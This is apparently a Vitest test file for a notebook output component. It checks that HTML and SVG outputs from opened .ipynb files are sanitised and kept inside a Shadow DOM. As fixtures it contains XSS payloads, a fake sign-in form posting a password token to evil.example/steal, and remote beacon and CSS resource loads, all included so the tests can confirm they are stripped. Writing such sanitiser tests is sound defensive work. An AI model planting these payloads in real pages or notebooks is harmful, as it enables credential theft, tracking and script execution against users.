/**
 * Tests for the notebook :class:`OutputArea` — rich outputs restored from
 * an opened ``.ipynb`` file are untrusted: they must be sanitised and
 * rendered in a Shadow DOM, out of reach of the rest of the page.
 */

import { render } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";

import { OutputArea } from "../../../src/components/notebook/OutputArea";
import { jsonStringToNotebook } from "../../../src/notebook/nbformat";
import type { CellOutput } from "../../../src/notebook/types";

vi.mock("react-plotly.js", () => ({
  default: () => <div data-testid="output-plot" />,
}));

function outputsFromIpynb(data: Record<string, unknown>): CellOutput[] {
  const text = JSON.stringify({
    nbformat: 4,
    nbformat_minor: 5,
    metadata: {},
    cells: [
      {
        cell_type: "code",
        execution_count: 1,
        metadata: {},
        source: ["result"],
        outputs: [
          { output_type: "display_data", data, metadata: {} },
          {
            output_type: "execute_result",
            execution_count: 1,
            data,
            metadata: {},
          },
        ],
      },
    ],
  });
  return jsonStringToNotebook(text).cells[0].outputs;
}

/** Return the Shadow DOM holding the markup of each *selector* block. */
function markupRoots(container: HTMLElement, selector: string): ShadowRoot[] {
  return Array.from(container.querySelectorAll(selector), (block) => {
    const root = block.firstElementChild?.shadowRoot;
    expect(root).toBeTruthy();
    return root as ShadowRoot;
  });
}

/** Render one HTML output and return its Shadow DOM. */
function renderHtml(html: string): {
  container: HTMLElement;
  root: ShadowRoot;
} {
  const { container } = render(
    <OutputArea
      outputs={outputsFromIpynb({ "text/html": html }).slice(0, 1)}
    />,
  );
  return { container, root: markupRoots(container, ".nb-output-html")[0] };
}

describe("OutputArea", () => {
  it("removes active content from HTML outputs of an opened notebook", () => {
    const outputs = outputsFromIpynb({
      "text/html": [
        '<p id="kept">Result</p>',
        '<img src="x" onerror="window.__dlwXss = true">',
        "<script>window.__dlwXss = true</script>",
        '<a href="javascript:alert(1)">link</a>',
        '<iframe src="https://example.com"></iframe>',
      ],
    });
    const { container } = render(<OutputArea outputs={outputs} />);

    const roots = markupRoots(container, ".nb-output-html");
    expect(roots).toHaveLength(2);
    const root = roots[0];
    expect(root.querySelector("#kept")?.textContent).toBe("Result");
    expect(root.querySelector("script")).toBeNull();
    expect(root.querySelector("iframe")).toBeNull();
    expect(root.querySelector("[onerror]")).toBeNull();
    expect(root.querySelector("a")?.getAttribute("href")).toBeNull();
  });

  it("keeps the style block of Sigima HTML results inside the output", () => {
    const { container, root } = renderHtml(
      "\n<style>\n .sigima-html-table { border-collapse: collapse; }\n</style>\n" +
        '<div class="sigima-html-container"><table class="sigima-html-table">' +
        "<tr><th>Property</th><th>Value</th></tr>" +
        "<tr><td style='text-align:right'>Size</td><td>3 values</td></tr>" +
        "</table></div>",
    );

    const styles = Array.from(
      root.querySelectorAll("style"),
      (s) => s.textContent,
    );
    expect(styles.some((css) => css?.includes(".sigima-html-table"))).toBe(
      true,
    );
    expect(root.querySelector("table.sigima-html-table")).not.toBeNull();
    expect(root.querySelectorAll("td")[1]?.textContent).toBe("3 values");
    expect(root.querySelector("td")?.getAttribute("style")).toBe(
      "text-align:right",
    );
    // Nothing reaches the document itself: the rules only apply inside the
    // output's Shadow DOM.
    expect(container.querySelector("style")).toBeNull();
    expect(container.querySelector("table")).toBeNull();
  });

  it("confines the output in a paint-contained block", () => {
    const { container } = renderHtml(
      '<div style="position: fixed; inset: 0; z-index: 99999">Fake dialog</div>',
    );
    const block = container.querySelector<HTMLElement>(".nb-output-html");
    expect(block?.style.contain).toBe("paint");
  });

  it("removes form controls and top-layer attributes", () => {
    const { root } = renderHtml(
      '<form action="https://evil.example/steal">' +
        '<input type="password" name="token"><textarea>t</textarea>' +
        "<select><option>o</option></select><button>Sign in</button></form>" +
        '<div id="pop" popover>Popover</div>' +
        '<p id="cmd" commandfor="pop" command="show-popover">Show</p>',
    );
    for (const tag of ["form", "input", "textarea", "select", "button"]) {
      expect(root.querySelector(tag)).toBeNull();
    }
    expect(root.querySelector("#pop")?.hasAttribute("popover")).toBe(false);
    expect(root.querySelector("#cmd")?.hasAttribute("commandfor")).toBe(false);
  });

  it("removes every remote resource of HTML outputs", () => {
    const { root } = renderHtml(
      '<img id="remote" src="https://evil.example/beacon.png">' +
        '<img id="local" src="data:image/png;base64,AAAA">' +
        '<img id="set" srcset="https://evil.example/2x.png 2x">' +
        '<table id="tbl" background="https://evil.example/bg.png"></table>' +
        '<a id="link" href="https://example.com/doc">doc</a>' +
        "<style>@import url('https://evil.example/a.css');" +
        ".x { background: url(https://evil.example/b.png); }" +
        ".y { background: image-set('https://evil.example/c.png' 1x); }" +
        "@font-face { font-family: f; src: url(https://evil.example/f.woff); }" +
        ".z { clip-path: url(#local-clip); }</style>" +
        '<p id="inline" style="color: red; background: URL(\'https://evil.example/d.png\')">t</p>',
    );
    expect(root.querySelector("#remote")?.hasAttribute("src")).toBe(false);
    expect(root.querySelector("#local")?.getAttribute("src")).toMatch(/^data:/);
    expect(root.querySelector("#set")?.hasAttribute("srcset")).toBe(false);
    expect(root.querySelector("#tbl")?.hasAttribute("background")).toBe(false);
    expect(root.querySelector("#link")?.getAttribute("href")).toBe(
      "https://example.com/doc",
    );
    const css = Array.from(root.querySelectorAll("style"), (s) => s.textContent)
      .concat(root.querySelector("#inline")?.getAttribute("style") ?? "")
      .join("\n");
    expect(css).not.toMatch(/(^|[^-])(url|image-set)\(\s*["']?https?:/im);
    expect(css).not.toMatch(/@import|@font-face/i);
    expect(css).toContain("url(#local-clip)");
    expect(css).toContain("color: red");
  });

  it("drops CSS whose escapes could hide a resource", () => {
    const { root } = renderHtml(
      "<style>.x { background: u\\72l(https://evil.example/e.png); }</style>" +
        "<p>t</p>",
    );
    const css = Array.from(
      root.querySelectorAll("style"),
      (s) => s.textContent,
    );
    expect(css.join("\n")).not.toContain("evil.example");
  });

  it("removes active content from SVG outputs of an opened notebook", () => {
    const outputs = outputsFromIpynb({
      "image/svg+xml":
        '<svg xmlns="http://www.w3.org/2000/svg" onload="window.__dlwXss = true">' +
        '<circle id="kept-circle" cx="5" cy="5" r="4" />' +
        "<script>window.__dlwXss = true</script>" +
        '<foreignObject><iframe src="https://example.com"></iframe></foreignObject>' +
        "</svg>",
    });
    const { container } = render(<OutputArea outputs={outputs} />);

    const block = markupRoots(container, ".nb-output-svg")[0];
    expect(block?.querySelector("svg")).not.toBeNull();
    expect(block?.querySelector("#kept-circle")).not.toBeNull();
    expect(block?.querySelector("script")).toBeNull();
    expect(block?.querySelector("foreignObject")).toBeNull();
    expect(block?.querySelector("iframe")).toBeNull();
    expect(block?.querySelector("[onload]")).toBeNull();
  });

  it("confines the style of SVG outputs and blocks their remote resources", () => {
    const outputs = outputsFromIpynb({
      "image/svg+xml":
        '<svg xmlns="http://www.w3.org/2000/svg">' +
        "<style>*{stroke-linejoin: round}</style>" +
        '<defs><clipPath id="c"><rect width="5" height="5"/></clipPath></defs>' +
        '<image id="img" href="https://evil.example/i.png"/>' +
        '<image id="data-img" href="data:image/png;base64,AAAA"/>' +
        '<rect id="clipped" clip-path="url(#c)" width="9" height="9"/>' +
        '<rect id="remote-fill" fill="url(https://evil.example/p.svg#p)"/>' +
        "</svg>",
    });
    const { container } = render(<OutputArea outputs={outputs} />);

    const root = markupRoots(container, ".nb-output-svg")[0];
    expect(container.querySelector("style")).toBeNull();
    expect(root.querySelector("svg style")?.textContent).toContain(
      "stroke-linejoin",
    );
    expect(root.querySelector("#img")?.hasAttribute("href")).toBe(false);
    expect(root.querySelector("#data-img")?.getAttribute("href")).toMatch(
      /^data:/,
    );
    expect(root.querySelector("#clipped")?.getAttribute("clip-path")).toBe(
      "url(#c)",
    );
    expect(root.querySelector("#remote-fill")?.hasAttribute("fill")).toBe(
      false,
    );
  });
});
